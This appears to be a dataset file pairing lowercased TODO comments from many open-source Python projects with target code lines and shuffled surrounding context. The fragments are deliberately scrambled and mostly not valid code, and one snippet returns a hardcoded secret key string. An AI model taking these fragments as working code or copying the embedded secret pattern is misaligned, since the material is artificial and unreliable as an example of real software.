# todo(py3.7): add required=true </s> subparsers = add_subparsers(parser, dest="applet", metavar="applet")	add_applet_arg def add_applet_arg(parser, mode, required=False): for applet_name, applet in GlasgowApplet.all_applets.items(): if mode == "test" and not hasattr(applet, "test_cls"):
pass  # todo </s> def change_name(self):	change_name @playlist_test
# todo: implement </s> conn = psycopg2.connect('dbname=sgeadmin user=sgeadmin')	select def select(self, querystring): cur = conn.cursor() cur.execute(querystring)
# todo: dispatch event via queue </s> self._logger.debug('dispatching trigger (trigger=%s,payload=%s)', trigger, payload)	dispatch assert(isinstance(payload, (type(None), dict)))
# todo: verify that workid is the primary key someplace. </s> yield workitem.dowork()	perform workItemClass = WorkItem.forTable(tableSyntax) workItem = yield workItemClass.load(workID)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_change_address_not_trytes def test_fail_change_address_not_trytes(self): ``change_address`` contains invalid characters.
# todo: assert </s> print(cnt.describe(percentiles=np.arange(0.1, 0.9, 0.1)))	testCSI300 print(size.describe(percentiles=np.arange(0.1, 0.9, 0.1)))
#todo: note that i'm passing a dc to the fuzzablerequest and it's not </s> fr = fuzzablerequest(self.url, method='get', dc={u'á': ['b']},	test_dump_case02 u'']) headers = Headers([(u'Hola', u'Múndo')]) headers=headers) self.assertEqual(fr.dump(), expected)
### todo: code this! </s> pass	_handle_select_tag_outside_form def _handle_select_tag_outside_form(self, tag, attrs):
# todo: remove this when hftransformersnlp is removed for good </s> logging.debug(	_get_docs_for_batch hf_transformers_doc = batch_examples[0].get(LANGUAGE_MODEL_DOCS[attribute]) if hf_transformers_doc: f"{LANGUAGE_MODEL_DOCS[attribute]} set: this " f"indicates you're using the deprecated component "
# todo: refactor into one function that just takes nodes </s> for i in range(count):	add_scanner_count count = int(root.getChildCount()) print "length: " + str(len(scanner_issues)) node = model.getChild(root, i) tree_issue_name = node.toString()
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
# todo: udpoutgoing style buffer </s> data = dustpacket(addr, data)	send_to def send_to(data, addr): udp_socket.sendto(data, 0, addr)
# todo: find out whether qid is optional, and optimise if so </s> extra = {	pull def pull(self, n=-1, qid=-1, **handlers): "n": n, "qid": qid,
# todo: handle situations where share is password protected </s> path = string.replace(path,'/', '\\')	list_path def list_path(self, shareName, path, password = None): path = ntpath.normpath(path) if len(path) > 0 and path[0] == '\\':
# todo: replace with a proxy lookup that doesn't have any side effects </s> response = self._dispatch('post',	apps_open if not app: app = self._session.app "/api/apps/{}/calculate".format(app)) if response.status_code == requests.codes.ok:  # @UndefinedVariable
# todo(dei): this code is not well-designed for large-scale scoring, where the </s> results = list(result_iter)	_score_with_estimator checkpoint_path, = get_checkpoint_iterator(eval_checkpoint_step, model_dir) result_iter = estimator.predict(input_fn, checkpoint_path=checkpoint_path) if num_examples is None: targets = [r["targets"] for r in results]
# todo: use the walrus operator </s> return sum(dist.pmf(c) * (1 - dist.pmf(c)) for c in dist)	gini_impurity References: 1. `A Simple Explanation of Gini Impurity <https://victorzhou.com/blog/gini-impurity/>`_
pass  # @todo: </s> def disable(self):	disable
# todo: auxiliary_vars </s> self.train_step(inputs, targets)	_train_step self.train_step(inputs, targets, auxiliary_vars) elif backend_name == "pytorch":
# todo link subscribers_changed in docstring to callback docs </s> return lib.sp_playlist_num_subscribers(self._sp_playlist)	num_subscribers May be zero until you call :meth:`update_subscribers` and the ``subscribers_changed`` callback is called.
# todo: larger gains expected with scipy.signal.signaltools.fftconvolve(). </s> psi = tf_signal.frame(y, k, 1, axis=-1)[:, :t - delay - k + 1, ::-1]	get_correlations_narrow T = dyn_shape[-1] D = dyn_shape[0] Psi_conj_norm = ( tf.cast(inverse_power[None, delay + K - 1:, None], Psi.dtype)
# todo results from ml </s> return str(endpoint.metadata)	_get_device_type @staticmethod def _get_device_type(endpoint):
# todo: cmake imported target shouldn't be namespaced (waiting https://github.com/conan-io/conan/issues/7615 to be implemented) </s> self.cpp_info.names["cmake_find_package"] = "cryptopp"	package_info def package_info(self): self.cpp_info.names["cmake_find_package_multi"] = "cryptopp" self.cpp_info.names["pkg_config"] = "libcryptopp"
# todo(developer): uncomment and set the following variables </s> parent = client.location_path(project_id, location_id)	create_scheduler_job from google.cloud import scheduler client = scheduler.CloudSchedulerClient() job = { 'app_engine_http_target': {
# todo(nmigen-0.2): remove this </s> @property	end @deprecated("instead of `slice.end`, use `slice.stop`") def end(self):
# todo: remove? </s> if self.requisitions_enabled:	setUp min_periods=0, ) self.ct_settings.requisition_config = get_default_requisition_config() self.ct_settings.save()
# todo: improve error handling </s> return make_response("error", status_code=500)	handle_ws asgi_cycle(self.app) except ASGIWebSocketCycleException:  # pragma: no cover return make_response("OK", status_code=200) elif event_type == "DISCONNECT":
pass  # todo: this </s> elif fi['type'] == 'keysect':	write self.f.write(data) elif fi['type'] == 'twl': keysect = list(fi['content']) keysect[offset:offset + len(data)] = data
# todo question: now that concurrent tags include vectorize tags, </s> if tv.address_space == addressspace.private:	_is_racing_iname_tag from loopy.kernel.data import (AddressSpace, LocalIndexTagBase, GroupIndexTag, ConcurrentTag, auto) return ( isinstance(tag, ConcurrentTag)
# todo: change this to be architecture independent </s> raise runtimeerror("could not retrieve processor type: %s" %ex)	get_proc_type except Exception as ex:
except exception:  # todo - which exceptions? </s> self.fail("treecluster failed to accept matrix data2")	test_matrix_parse try: treecluster(data2) self.assertRaises(TypeError, lambda: treecluster(data3)) self.assertRaises(TypeError, lambda: treecluster(data4))
# todo add 'header' and 'background image' to testing </s> self.data['team_type'] = team.core_team	test_create_team_member_custom_team_type def test_create_team_member_custom_team_type(self): response = self.client.post(self.url, self.data) self.assertEqual(response.status_code, status.HTTP_201_CREATED)
# todo add locales </s> raise yunohosterror("domain_name_unknown", domain=domain)	domain_setting domains = _load_domain_settings() if not domain in domains.keys(): domain_settings = _get_domain_settings(domain, False) or {} if value is None and not delete:
# todo: change to hostname </s> return current_machine["um_network_key"]	getStoredKey current_machine = self._api.machines.getCurrentMachine()
# todo: arrange </s> repo = self.remote.get_item_handle("repo", "testrepo0", self.token)	test_rename_repo def test_rename_repo(self, createRepo): Test: rename a repo object self.assertTrue(self.remote.rename_repo(repo, "testrepo1", self.token))
# todo: something smarter? </s> from nbdime import diff	diff_single_cells def diff_single_cells(a, b): return diff(a, b)
# todo: allow specification of sentinel </s> stage_sentinel = "file in stage dir"	build if forcing['build'] or not exists(build_sentinel): sudo("make") if forcing['stage'] or not exists(stage_sentinel): with settings(warn_only=True):
# todo: add specific coverage here </s> if ignore_nonexistent_tables:	reduce_columns fk_col = fk.column except exc.NoReferencedColumnError: continue else:
# todo: implement! </s> raise notimplementederror()	_stop_platform def _stop_platform(self):
# todo: this check has the unfortunate side-effect that </s> if isinstance(nc, basestring) and not nc.startswith('cdf'):	open_dataset def open_dataset(nc, decode_cf=True, *args, **kwargs): *args and **kwargs provide format specific options store = backends.NetCDF4DataStore(nc, *args, **kwargs) else:
# todo: support all tzinfo subclasses by calling utcoffset() </s> if tz:	from_timestamp def from_timestamp(timestamp, tz=None): offset = C.CAPI.get_local_utc_offset() if type(tz) is TZFixedOffset: offset = tz.offset
# todo tell it to some human operator </s> pass	create f.write(json.dumps(self._store[key].dump())) except IOError:
# todo: "wildcards" other than <any> </s> if type == "<any>" or atype == "<any>" or type == atype:	__directory_relations_by_arg_num types = r.arguments[r.arg_list[num]] for type in types: rels.append(r) return rels
# todo deprecate? </s> return self.raw.get('fulltext')	text def text(self) -> Optional[str]:
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
#todo: check the data! </s> count = 0	test_filtered_multiple_sources pipe_def = self._get_pipe_def("pipe_c1cfa58f96243cea6ff50a12fc50c984.json") p = pipe2py.compile.parse_and_build_pipe(pipe_def, verbose=True) for i in p: count += 1
# todo: needs to be fixed after series is converted into sqlalchemy </s> self.feed.shared_cache.set_namespace('series')	testSeries def testSeries(self): pass s = self.feed.shared_cache.get('some series') self.assertEqual(isinstance(s, dict), True)
pass # todo </s> def handle_request(self, input):	handle_request
# todo remove </s> definition = self._definition	_follow_statements_imports def _follow_statements_imports(self): return self._name.infer() if definition.isinstance(tree.Import): i = imports.ImportWrapper(self._evaluator, self._name)
# todo 为适应私人收藏夹临时修改，正式版中必须改正 </s> itag = re.search(r'<i.*>.*?</i>', infodict['title'])	getInfoDict infoDict = {} infoDict['title'] = self.getTagContent(self.content.find('h2', {'id': 'zh-fav-head-title'})) if not(iTag is None): infoDict['title'] = infoDict['title'].replace(iTag.group(0), '')
# todo: probably should modify emulator driver to de-prioritize this </s> logging.getlogger("emulatordriver").setlevel(emulator_driver_level)	set_log_config emulator_driver_level = logging.CRITICAL logging.getLogger("vivisect.parsers.pe").setLevel(log_level) logging.getLogger("Monitor").setLevel(log_level) logging.getLogger("envi/codeflow.addCodeFlow").setLevel(log_level)
#todo: do we really need the history? </s> history = self.get_history( trans, history_id,	show check_ownership=False, check_accessible=True ) else: check_ownership=True, check_accessible=True, deleted=False ) hda = self.get_history_dataset_association( trans, history, id,
# todo: normalize dict entries to make reverse lookup more reliable with </s> translation = event.getstring().strip()	on_translations_change def on_translations_change(self, event): if translation: d = self.engine.get_dictionary()
# todo(mriedem): make this smarter by keeping track of our bindings </s> return fake_requests.fakeresponse(204)	fake_delete_port_binding @staticmethod def fake_delete_port_binding(client, port_id, host):
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
# compare filesizes todo print analysis of this :) </s> cmd = "ls -l '%s.ttf'*" % filename	ttx_process cmd = "ttx -i '%s.ttx'" % filename run(cmd, cwd=_out, log=log) run(cmd, cwd=_out, log=log) cmd = "rm  '%s.ttf.orig'" % filename
pass # todo </s> image_ids: list of image ids.	PredicateDataset save_dir: Location to save the data.
# todo(b/166479382): this cleanup-before-invocation pattern is a workaround </s> with tracing.span(	_call_embedded_tf Raises: RuntimeError: If `arg` and `param_fns` have different numbers of elements. 'EagerTFExecutor.create_call', 'resource_cleanup_before_invocation',
# todo(stephenfin): remove cells_enabled parameter when we removed </s> num_instances = 1	test_single_instance_display_name def test_single_instance_display_name(self): the display and host names. refs, _ = self.compute_api.create(self.context, flavors.get_default_flavor(),
# todo: remove this test as soon as all old test methods are migrated </s> from sage.misc.sage_unittest import testsuite	test_old_testsuite def test_old_testsuite(self, backend: GenericBackend): TestSuite(backend).run(verbose=True, raise_on_failure=True, skip="_test_pickling")
# todo: handle `stream.close` and `stream.reset` </s> if peer_id not in self.handshaked_peers:	Node peer_id: ID, block_roots: Sequence[Hash32]) -> Tuple[BaseBeaconBlock, ...]: error_msg = f"not handshaked with peer={peer_id} yet" self.logger.info("Request recent beacon block failed: %s", error_msg)
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo remove the day prefix of the file that was there prior to the crawl </s> file_name = filesystem.get_file_name(media)	process_file directory_name = filesystem.get_folder_path(date=metadata['date_taken'], latitude=metadata['latitude'], longitude=metadata['longitude']) dest_directory = '%s/%s' % (destination, directory_name) dest_path = '%s/%s' % (dest_directory, file_name) filesystem.create_directory(dest_directory)
''' </s> if inplace:	transposeAboveTarget >>> pitch.Pitch('d0').transposeAboveTarget(pitch.Pitch('e2'), minimize=True) <music21.pitch.Pitch D3> src = self else:
# todo: remove in v8 </s> if show_all is none:	_do_post_list posts = [] step = -1 if reverse is None else None timeline = [p for p in site.timeline] elif post_type == 'page':
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: see get_scale_factor() to choose 72 px on hidpi </s> if icon and icon.bind(interface.factory):	pixbuf def pixbuf(clazz, interface, icon): pixbuf = None pixbuf = getattr(icon.bind(interface.factory), 'native_%i' % clazz.icon_size()).get_pixbuf() return pixbuf
except typeerror as e:          #todo: generalise for all api methods </s> raise exception(str(e))	get_method try: return get_rows(db, table=table, **kwargs)
#todo: should use .append instead of writing directly to _rows? </s> self.table.identify_data_types(sample_size=none)	setUp [2, u'another-user', datetime.date(2000, 1, 1)], [3, u'álvaro', datetime.date(1900, 1, 1)], ] self.expected = textwrap.dedent(u''' +----+--------------+------------+
#todo replace dot with dotfunc? </s> def dotfunc(a, b):	dotfunc Computes the dot product of two variables. For two matrices, this is equivalent to matrix multiplication. For two vectors, this is the inner
# todo: call all server </s> if self._uuid:	close def close(self): self.project_about_to_close_signal.emit() self._servers.localServer().post("/project/{uuid}/close".format(uuid=self._uuid), self._project_closed, body={})
# todo - log details about the test </s> return test.details.connected	check_mvip_connection try: test = self.elem.test_connect_mvip(mvip=self.parameters['mvip']) except Exception as e: self.msg += 'Error checking connection to MVIP: %s' % to_native(e)
"""todo: doesn't remove unused nodes/renumber elements""" </s> x = self.xyz[:, 0]	slice_x def slice_x(self, xslice): self._slice_plane(x, xslice)
# todo(dcramer): ideally we could fire off jobs to sync test results </s> for action in item['actions']:	_sync_build_from_active db.session.add(build) db.session.commit() if action.get('urlName') == 'testReport': self._sync_test_results(build, entity)
# todo: call all server when we got uuid </s> log.info("project {} created".format(self._uuid))	project_created self._uuid = params["uuid"]
# todo: error detection </s> ctype = obj.collection_type()	serialize def serialize(obj): Save an object to the database. for x in obj: serialize_item(obj,x)
# todo implement </s> try:	get def get(self, k, d=None): pass except KeyError:
# todo: remove this when domain decomposition is merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_dd_mesh_dimension def set_dd_mesh_dimension(self, dimension): 'version of openmc') if not isinstance(dimension, tuple) and \
# todo extend to nonbinary nodes </s> tpm_on = tpm_on.sum(index, keepdims=true) / 2	__init__ for index in range(self.network.size): if index not in self._input_indices: tpm_off = tpm_off.sum(index, keepdims=True) / 2 self.tpm = np.array([tpm_off, tpm_on])
# todo: show the declaration info somewhere. </s> completions.append(	get_completion_list identifier = d['identifier'] declaration_info = d['info'] (identifier[:MAX_COMPLETION_LENGTH], identifier)) return completions
# todo: slow. </s> logger.debug('formatting outputs.')	get_unspent_txouts raw_transactions = searchrawtransactions(source, unconfirmed=unconfirmed) raw_transactions = sorted(raw_transactions, key=lambda x: x['confirmations']) outputs = [] for tx in raw_transactions:
# todo: make keys get passed through files or environment </s> if not cipher:	encrypt def encrypt(self, data, cipher=None): cipher = self.defaultcipher salt = sha512(str(random.getrandbits(512))).hexdigest()[:32]
# todo: round values properly!: </s> new_duty_ns = int(duty_percent * new_period_ns)	pwmFrequency duty_percent = old_duty_ns / old_period_ns new_period_ns = 1e9/freq_hz try: kernelFileIO(PWM_FILES[pwm_pin][PWM_DUTY], '0')
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	solve warmstart, variable_transmission): PersistentSolver if self._verbose:
raise retry(encode(reason))  #@todo: remove `encode` in 0.4.10 </s> self.req = self.pyload.requestfactory.getrequest(self.__name__)	restart self.account = None
# todo test with matlab </s> mat_answser = none	test_estimate_lmax def test_estimate_lmax(G): self.assertEqual(utils.estimate_lmax(G), mat_answser)
## todo: decode </s> folder_path = unicode(struct.unpack_from('%ds' % (name_size - 1),	__init__ if has_folder_names: name_size = struct.unpack_from('B', file_records_block, file_records_index)[0] file_records_block, file_records_index + 1)[0]) file_records_index += name_size + 1
# @todo: investigate why this isn't working </s> db = current.db	setup_run_playbook if hosts is None: hosts = ["127.0.0.1"] W2P_TASK = current.W2P_TASK table = current.s3db.scheduler_run
# todo: handle this </s> print "[papyon]", contact, "joined a conversation"	on_conversation_user_joined def on_conversation_user_joined(self, contact):
# todo: parent searching is not yet implemented </s> post = self.getelementsbyclass(key.keysignature)	getKeySignatures >>> len(c) == 1 True if len(post) == 0 and searchContext: post = Stream()
# todo: implement this rpc service </s> return empty_pb2.empty()	pull_embedding_vector def pull_embedding_vector(self, request, _):
# todo: fix this for mmcblk devices </s> number = int(device_to_shrink[len("/dev/sdx"):])	get_new_device def get_new_device(device_to_shrink): returns an empty string if no device is available """ disk = device_to_shrink[:len("/dev/sdX")] new_number = number + 1
# todo: refactor, move to utils </s> from django.template import context, template, templatesyntaxerror	string_template_replace def string_template_replace(self, text, context_dict): try: t = Template(text)
# todo: what does failing here look like? </s> else:	_update_repo if remote: repo.fetch(remote=remote) track_remote, track_branch = repo.get_tracking_branch() if track_remote:
# todo: consider adding a parameter `ignore_padding=true` and when it's </s> start_row = start_row if start_row is not none else min_row	import_from_xlsx min_row, min_column = sheet.min_row - 1, sheet.min_column - 1 max_row, max_column = sheet.max_row - 1, sheet.max_column - 1 end_row = end_row if end_row is not None else max_row start_column = start_column if start_column is not None else min_column
# todo: @sbharadwajj implement and test </s> raise notimplementederror	_jac_t_mat_prod def _jac_t_mat_prod(self, module, g_inp, g_out, mat):
# todo: remove deprected flags in 1.2 </s> self._deprecated_fit, self._deprecated_partial_fit = true, false	fit min_val=1, ) return self._fit(X, partial=False)
# todo: kept for backwards compatibility. </s> self.report_dict = none	__init__ self.event_filter = None self.plugin_name = plugin_name self.text = text self.time_compiled = None
# todo: move this function somewhere else </s> return stats	get_raw_directory_stats }
# todo(justinsb): mock doesn't yet do this... </s> self.assertequal('active', found_server['status'])	test_deferred_delete created_server_id = created_server['id'] found_server = self._wait_for_state_change(created_server, 'BUILD') self.api.delete_server(created_server_id) found_server = self._wait_for_state_change(found_server, 'ACTIVE')
# todo: implement </s> return {"dummy": "put"}	put POST /actions/1?_method=put PUT /actions/1
# todo: [code] what to do to leave this? </s> if stop_system_importer_file_csv_run:	system_upload if check_systemcsv: stop_system_importer_file_csv = run_check_config_attributes(model) pass system_handler(request, True)
# todo docstring </s> global confs	load_confs def load_confs(confs_path='../confs/confs.yaml'): if CONFS is None: try:
# todo: for multi-gpu, the final-loss will probably have to come from the optimizer. </s> return step_op, loss, loss_per_item, q_values_s	update_from_external_batch policy_vars = self_.call(policy._variables) step_op = self_.call(optimizer.step, policy_vars, loss)
"""todo: check this implementation""" </s> unit = (	checkerboard def checkerboard(shape, parity="even", dtype=tf.bool): tf.constant((True, False)) if parity == "even"
# todo(nakago): check why tolerance is high </s> @pytest.mark.gpu	test_backward_gpu def test_backward_gpu(model_no_dropout, data): atom_data, adj_data, y_grad = [cuda.to_gpu(d) for d in data]
data.append(get_casedb_schema(app))  # todo use domain instead of app </s> data.extend(	get_data_schema raise Http404() if form and form.requires_case(): sorted(item_lists_by_domain(domain), key=lambda x: x['name'].lower()) )
# todo stub </s> pass	create_catalyst def create_catalyst(self, original_df):
# todo: move this! this is generic code. </s> model = self.tree_model	_new_model_content Open the toplevel element and load toplevel diagrams. self.tree_view.expand_root_nodes() try: iter = model.get_iter((0,))
# todo this requires fleshing out some more.. </s> field = string(name='name', required=true)	test_string_input def test_string_input(): result = field.marshal({'name': 'foo', 'email': 'mike@mike.com'}) assert result == 'foo'
# todo: are we still using this? </s> lbrycrdd_path_conf = os.path.join(os.path.expanduser("~"), ".lbrycrddpath.conf")	Daemon self.wallet_dir = os.path.join(os.path.expanduser("~"), ".lbryum") if os.name != 'nt': if not os.path.isfile(lbrycrdd_path_conf): f = open(lbrycrdd_path_conf, "w")
# todo: handle `stream.close` and `stream.reset` </s> peer_id = stream.mplex_conn.peer_id	Node await stream.close() async def _handle_beacon_blocks(self, stream: INetStream) -> None: if peer_id not in self.handshaked_peers: self.logger.info(
# todo refactor this to take an arbitrary number of models rather than just a linear and random forest </s> model_evaluation.display_roc_plot(self.ytest, self.y_probab_linear, self.y_probab_rf, save=save, debug=debug)	plot_roc def plot_roc(self, save=False, debug=True):
# todo in python 2.7 and later, this should be a dict comprehension. </s> attributes = dict((k, (v() if callable(v) else v))	DefaultSerializer attributes = dict((column, getattr(instance, column)) for column in columns) for k, v in attributes.items())
# todo implement .!{cmd} (ex shell out) test for windows </s> self.assertcontent(line)	test_text_escaping })
# matches sphinx-autodoc behaviour of comma separated values </s> members = set(['%s%s' % (prefix, x.strip()) for x in text.split(",")])	create_innerclass_filter text = options["members"] prefix = ('%s::' % outerclass) if outerclass else '' node_valueOf_is_in_members = node.valueOf.is_one_of(members) public_innerclass_filter = ~ node_is_innerclass_in_class | node_valueOf_is_in_members
# if intersection has changed, add sons to the todo list </s> if new_post_dom == postdominators[node]:	compute_postdominators assert(new_post_dom is not None) new_post_dom.update(set([node])) continue postdominators[node] = new_post_dom
# todo: for the domain-allocation switch, this needs to return the shape </s> raise notimplementederror	shape_allocated It includes the domain and halo regions, as well as any additional padding outside of the halo.
# todo discont: use offsets instead (note need for int conversion) </s> if (int(start) != tb_ann.start or int(end) != tb_ann.end):	_edit_span undo_resp['offsets'] = tb_ann.spans[:] undo_resp['type'] = tb_ann.type if not isinstance(tb_ann, TextBoundAnnotation):
from_block = 0  # todo: we can do better. get contract creation block. </s> if to_block is none:	wrapper def wrapper(from_block=None, to_block=None, **argument_filters): if from_block is None: to_block = 'latest' event_filter = event_method.createFilter(fromBlock=from_block,
# todo @niklasrosenstein: handle metaclass arguments </s> pass	parse_classdef metaclass = Expression(value) else: else: bases.append(Expression(str(child)))
# todo: rename int_to_str?  or str::from_int()? </s> if (callee_name not in ('str', 'bool', 'float') and	_IsInstantiation if isinstance(callee_type, CallableType): ret_type = callee_type.ret_type isinstance(ret_type, Instance)): ret_type_name = ret_type.type.name()
# todo: it is not needed </s> recent = [pretty_path(p) for p in recent]	update_recent j = JsonFile(os.path.join(self.primary_dir, 'recent.json')) recent = j.load([]) pname = pretty_path(self.project_file_name(project)) if pname not in recent:
# todo set only zero order </s> vals = nm.repeat([fun], nods.shape[0] * dpn)	set_volume_dofs nods = nm.unique(nm.hstack(aux)) if nm.isscalar(fun): elif isinstance(fun, nm.ndarray): assert_(len(fun) == dpn)
# todo: we have to put [:100] on the end of the query due to issue #3431 </s> def test_search_all(self):	test_search_all results = self.backend.search(None, models.Book)[:100] self.assertEqual(set(results), set(models.Book.objects.all()))
pass # todo implement displaying this in the conversationwidget </s> if conversation_id == self.conversation_id:	on_focus_update focus_device):
# todo: candidate for move to system/hdparm </s> if dev_byid is none:	set_disk_spindown :return: False if an hdparm command was not possible ie inappropriate dev, or an error was return by the command, True otherwise. return False dev_byid_withpath = '/dev/disk/by-id/%s' % dev_byid
lookup_view(self.window.active_view()).view_breakpoints() #todo fix view </s> global paused	resumed global current_call_frame_position current_call_frame_position = None paused = False
return self._plugin.content_assist_values(value) # todo: remove old functionality when no more needed </s> return self._controller.get_local_namespace_for_row(row).get_suggestions(value)	SuggestionSource if self._controller:
# todo: investigate why results are sometimes 'nan' </s> pass	render_pupil ) except ValueError:
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo(jflesch): i18n/l10n </s> msg = "python-imaging-sane not found. scanning will be disabled."	_find_scanner self.device = None if not HAS_SANE: dialog = gtk.MessageDialog(parent = None, flags = gtk.DIALOG_MODAL,
uploader.upload_file(file, container='export') # todo: right container folder?! </s> finally:	export_csv zip.close() file = FileStorage(filename='%d_%s_task_run_csv.zip' % (app.id, name), stream=zipped_datafile) zipped_datafile.close() finally:
# todo: use invalidation time </s> params: channelfull, channel to dump, mediaid of the profile photo in the db	dump_channel def dump_channel(self, channel_full, channel, photo_id): Returns -""" timestamp = round(time.time())
# todo: cut this down somehow? </s> logger.warning('log from failed pod: %s', self._getlogforpod(pod))	getUpdatedBatchJob pod.status.start_time).total_seconds() if chosenFor == 'failed': else: logger.warning('Exit code and runtime unavailable; pod stopped without container terminating')
# todo: remove check once pytorch avoids a copy for this case </s> if p.data_ptr() != p_data_fp32.data_ptr():	step p_data_fp32.add_(-group['weight_decay'] * group['lr'], p_data_fp32) p_data_fp32.add_(-update) p.data.copy_(p_data_fp32) return loss
# todo: change user for calling importer </s> csv_import()	system_cron def system_cron():
# todo: gan may yield unstable results; turning performance check off </s> self.x_train, self.y_train, self.x_test, self.y_test = generate_data(	setUp self.n_features = 10 self.contamination = 0.1 n_train=self.n_train, n_test=self.n_test, n_features=self.n_features, contamination=self.contamination,
# todo yield </s> lgr.warning(	_configure_remote 'autoenable=true']) else: 'Not configuring "%s" as a common data source, ' 'URL protocol is not http or https',
output_zero_point = none  # todo non-zero zero point </s> output = quanttensor(	__mul__ output_zero_point = self.zero_point * other.zero_point else: value=output_value, scale=output_scale,
# todo: handle 'narg' and 'append' options </s> if action.option_strings:	traverse_parser for action in parser._actions: if action.dest in self._args: cmd_str[0] += '"{}" "{}" '.format(action.option_strings[0], self._args[action.dest]) else:
# todo: description </s> return _check_global(global_params, result_dict, 'snooping', 'snooping', 'turn it on to prevent spoofing attack')	snooping_global def snooping_global(global_params, result_dict):
pass # todo: raise exception </s> else:	connect self.__signals[signal].append(function) else: pass # TODO: raise exception
# todo: this will greedily query the same cases multiple times in a sharded </s> batch = caseaccessorsql.get_cases_modified_since(start_from, limit=chunk_size)	get_all_cases_modified_since def get_all_cases_modified_since(server_modified_on_since=None, chunk_size=500): start_from = server_modified_on_since or datetime.min while len(batch) == chunk_size: for case in batch:
tasks = ss("#todo-list>li") </s> visit("file:///users/ayia/dropbox/apps/heroku/todomvc4tasj/home.html")	test_selene_demo def test_selene_demo(self): for task_text in ["1", "2", "3"]: s("#new-todo").set_value(task_text).press_enter()
# todo(kpy): this only works for subdomains that have a single fixed </s> time_zone_offset = timedelta(0)	get reveal_url = reveal.make_reveal_url(self, content_id) show_private_info = reveal.verify(content_id, self.params.signature) if self.config.time_zone_offset: time_zone_offset = timedelta(0, 3600*self.config.time_zone_offset)
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: replicate complete behaviour of urllib.urlopener.open </s> def __tuf_open( self, parsed_url, tuf_configuration, data = none ):	__tuf_open def getcode( self ): return 200
# todo(cutwater): replace `.decode('utf-8')` call with subprocess </s> yield line.decode('utf-8').strip()	Flake8Linter proc = subprocess.Popen(cmd, cwd=self.root, stdout=subprocess.PIPE) for line in proc.stdout: proc.wait() def parse_id_and_desc(self, message):
# todo: used to ignore eoferror. i hope things still work. </s> self.tracks.append(self._read_track())	__init__ for i in range(number_of_tracks):
'message': 'certainly <b> unfortunate </b>',  # todo: <- </s> 'subject': 'reports of spam',	set_initial 'email': [(r, r) for r in spam['author'].emails],
#todo: save the hotspot_x and y in the filename </s> for frame in slp_file.get_frames():	create_slp_pngs frame_path = os.path.join(base_slp_path, "%06d_%03d_%02d.png" % (slp_file.file_id, frame.frame_id, player_id)) png = PNG(player_id, color_table, frame.get_picture_data())
# todo handle 404 </s> return response(status=status.http_204_no_content)	partial_update else: self.client.minion_reject(pk)
# todo: check return value of attachthreadinput properly </s> else:   # same threads - just set the foreground window	SetFocus win32functions.SetForegroundWindow(self) win32functions.AttachThreadInput(cur_fore_thread, control_thread, win32defines.FALSE) win32functions.SetForegroundWindow(self) win32functions.WaitGuiThreadIdle(self)
#todo: milestones = get_milestones(destination_url) </s> milestones = []	import_some_issues def import_some_issues(issue_ids): labels = get_labels(destination_url) issues = []
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
# todo: choose one from the following two </s> config.add_no_good_cuts = false	check_config config.init_strategy = "feas_pump" config.iteration_limit = 0 config.use_tabu_list = True if config.nlp_solver == "baron":
# todo(laigd): remove this check when 313682500 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	IfTest ) def testSimple(self, use_tf_function): return FLAGS.if_use_tf_function = use_tf_function
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: require tests </s> def _weight_for_batch_average(self, ext, module, backproped):	_weight_for_batch_average kron_factors = [self._factor_from_batch_average(module, backproped)] kron_factors += self._factors_from_input(ext, module)
# todo: check if this different handling of none and '' has </s> if result == none:	run args['query'] = query result = self._query(vector, args) log.warn('%s %s' % (messages.module_sql_console.no_data, messages.module_sql_console.check_credentials)
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
# todo implement other types </s> return	calculate_leverage_factor lev_df = lev_df.resample(vol_rebalance_freq).mean() else: returns_df, lev_df = returns_df.align(lev_df, join='left', axis = 0) lev_df = lev_df.fillna(method='ffill')
# todo(nisanthan): revisit for supporting multiple codeowners. </s> if projectcodeowners.objects.filter(project=project).exists():	post data={**request.data}, ) return Response( data={"details": "There exists a CODEOWNERS file for this project."},
# todo: the error raised here should be different </s> raise rpcerror("db: %s, table: %s is not unique" % (database_name, table_name))	get_table_schema tables.add((col[1], col[2])) if len(tables) > 1: return [(r[3], impala.rpc._PrimitiveType_to_TTypeId[r[5]]) for r in results]
# todo: have a single list in place of two directional ones? </s> for direction in ['vertical', 'horizontal']:	_generate_table table = table.set_all_edges() pos_errors = [] for t in self.t_bbox[direction]: indices, error = get_table_index(
